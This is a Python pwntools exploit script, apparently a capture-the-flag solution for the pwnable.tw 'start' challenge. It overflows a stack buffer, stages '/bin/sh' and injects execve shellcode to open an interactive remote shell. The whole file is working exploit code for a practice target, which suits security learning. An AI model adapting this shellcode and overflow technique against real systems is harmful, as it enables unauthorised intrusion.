from pwn import *
import signal
import sys

host = "chall.pwnable.tw"
port = 10000 

bin_sh = b'/bin/sh\x00'
pad = b'a' * 20
ret = 0x804809c
start = 0x8048060

shell = b'\x90\x90\x5b\x83\xc3\x22\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'

while True:
	try:
		p = remote(host, port)

		payload = pad + p32(start) + bin_sh
		p.recvuntil(b'Let\'s start the CTF:')
		p.sendline(payload)
	
		for i in range(2):
			payload = pad + p32(start)	
			p.recvuntil(b'Let\'s start the CTF:')
			p.sendline(payload)

		payload = shell + b'a' * (20 - len(shell)) + p32(ret)

		p.recvuntil(b'Let\'s start the CTF:')
		p.sendline(payload)	

		p.interactive()
	except:
		p.close()
